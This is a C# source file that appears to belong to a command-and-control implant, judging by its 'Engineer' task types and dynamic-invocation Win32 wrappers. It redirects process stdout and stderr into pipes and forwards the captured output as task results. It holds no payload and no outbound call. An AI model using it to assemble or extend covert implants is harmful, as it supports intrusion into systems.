using Microsoft.Win32.SafeHandles;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using static DynamicEngLoading.h_DynInv.Win32;
using static DynamicEngLoading.h_DynInv_Methods;

namespace DynamicEngLoading
{
    public sealed class FileDescriptorPair
    {
        public IntPtr Read { get; set; }
        public IntPtr Write { get; set; }
    }

    public sealed class FileDescriptorRedirector
    {
        private IntPtr _oldGetStdHandleOut;
        private IntPtr _oldGetStdHandleIn;
        private IntPtr _oldGetStdHandleError;

        private FileDescriptorPair _kpStdOutPipes;
        private FileDescriptorPair _kpStdInPipes;
        private Task<string> _readTask;
        private IntPtr oldConsoleWindow;

        public bool RedirectFileDescriptors()
        {
            try
            {
                _oldGetStdHandleOut = GetStdHandleOut();
                _oldGetStdHandleIn = GetStdHandleIn();
                _oldGetStdHandleError = GetStdHandleError();

                _kpStdOutPipes = CreateFileDescriptorPipes();

                if (_kpStdOutPipes == null)
                {
                    throw new Exception("Unable to create STDOut Pipes");
                }

                _kpStdInPipes = CreateFileDescriptorPipes();

                if (_kpStdInPipes == null)
                {
                    return false;
                }
                return RedirectDescriptorsToPipes(_kpStdOutPipes.Write, _kpStdInPipes.Write, _kpStdOutPipes.Write);
            }
            catch (Exception ex)
            {
                return RedirectDescriptorsToPipes(_kpStdOutPipes.Write, _kpStdInPipes.Write, _kpStdOutPipes.Write);
            }

        }

        public bool RedirectFileDescriptors_External(ref h_DynInv.Win32.ProcessThreadsAPI._STARTUPINFO startInfo)
        {
            try
            {
                //_oldGetStdHandleOut = GetStdHandleOut();
                //_oldGetStdHandleIn = GetStdHandleIn();
                //_oldGetStdHandleError = GetStdHandleError();

                _kpStdOutPipes = CreateFileDescriptorPipes();
                _kpStdInPipes = CreateFileDescriptorPipes();
                if (_kpStdOutPipes == null)
                {
                    return false;
                }
                if (_kpStdInPipes == null)
                {
                    return false;
                }
                startInfo.cb = Marshal.SizeOf(startInfo);
                startInfo.hStdInput = _kpStdInPipes.Write;
                startInfo.hStdOutput = _kpStdOutPipes.Write;
                startInfo.hStdError = _kpStdOutPipes.Write;
                return true;
                
            }
            catch (Exception ex)
            {
               return false;
            }

        }

        public string ReadDescriptorOutput()
        {
            while (!_readTask.IsCompleted)
                Thread.Sleep(2000);

            return _readTask.Result;
        }

        public void ResetFileDescriptors()
        {
            RedirectDescriptorsToPipes(_oldGetStdHandleOut, _oldGetStdHandleIn, _oldGetStdHandleError);
            ClosePipes();
        }

        private static IntPtr GetStdHandleOut()
        {
            return Ker32FuncWrapper.GetStdHandle(Kernel32.STD_OUTPUT_HANDLE);
        }

        private static IntPtr GetStdHandleError()
        {
            return Ker32FuncWrapper.GetStdHandle(Kernel32.STD_ERROR_HANDLE);
        }

        private void ClosePipes()
        {
            CloseDescriptors(_kpStdOutPipes);
            CloseDescriptors(_kpStdInPipes);
        }

        public void StartReadFromPipe(EngineerTask engtask)
        {
            _readTask = Task.Factory.StartNew(() =>
            {
                var output = "";
                var buffer = new byte[1024];
                byte[] outBuffer = null;
                byte[] previousBuffer = null;
                while (true)
                {
                    var ok = Ker32FuncWrapper.ReadFile(_kpStdOutPipes.Read, buffer, 1024, out var bytesRead, IntPtr.Zero);
                    if (!ok)
                    {
                        break;
                    }
                    if (bytesRead != 0)
                    {
                        outBuffer = new byte[bytesRead];
                        Array.Copy(buffer, outBuffer, bytesRead);

                        // If previousBuffer is null or its contents are different from outBuffer, then we have new data
                        if (previousBuffer == null || !outBuffer.SequenceEqual(previousBuffer))
                        {
                            // Update the output and previousBuffer with the new data
                            output = Encoding.Default.GetString(outBuffer);
                            ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults(output, engtask, EngTaskStatus.Running, TaskResponseType.String);
                            previousBuffer = outBuffer;
                        }
                    }
                    Thread.Sleep(1000);
                    if (engtask.cancelToken.IsCancellationRequested)
                    {
                        break;
                    }
                }
                return "";
            });
        }

        private static IntPtr GetStdHandleIn()
        {
            return Ker32FuncWrapper.GetStdHandle(Kernel32.STD_INPUT_HANDLE);
        }

        private static void CloseDescriptors(FileDescriptorPair stdoutDescriptors)
        {
            try
            {
                if (stdoutDescriptors.Write != IntPtr.Zero)
                    Ker32FuncWrapper.CloseHandle(stdoutDescriptors.Write);

                if (stdoutDescriptors.Read != IntPtr.Zero)
                    Ker32FuncWrapper.CloseHandle(stdoutDescriptors.Read);
            }
            catch
            {
                // meh
            }
        }

        private static FileDescriptorPair CreateFileDescriptorPipes()
        {
            var lpSecurityAttributes = new WinBase._SECURITY_ATTRIBUTES();
            lpSecurityAttributes.nLength = Marshal.SizeOf(lpSecurityAttributes);
            lpSecurityAttributes.bInheritHandle = true;

            var outputStdOut = Ker32FuncWrapper.CreatePipe(out var read, out var write, ref lpSecurityAttributes, 0);

            if (!outputStdOut)
                return null;

            return new FileDescriptorPair
            {
                Read = read,
                Write = write
            };
        }

        private static bool RedirectDescriptorsToPipes(IntPtr hStdOutPipes, IntPtr hStdInPipes, IntPtr hStdErrPipes)
        {
            var bStdOut = Ker32FuncWrapper.SetStdHandle(Kernel32.STD_OUTPUT_HANDLE, hStdOutPipes);

            if (!bStdOut)
                return false;

            var bStdError = Ker32FuncWrapper.SetStdHandle(Kernel32.STD_ERROR_HANDLE, hStdErrPipes);

            if (!bStdError)
                return false;

            //var bStdIn = Ker32FuncWrapper.SetStdHandle(Kernel32.STD_INPUT_HANDLE, hStdInPipes);

            //if (!bStdIn)
            //    return false;

            return true;
        }
    }
    
    //copy from bcl
    public class ProcessWaitHandle : WaitHandle
    {
        public ProcessWaitHandle(SafeWaitHandle processHandle)
        {
            base.SafeWaitHandle = processHandle;
        }
    }

}
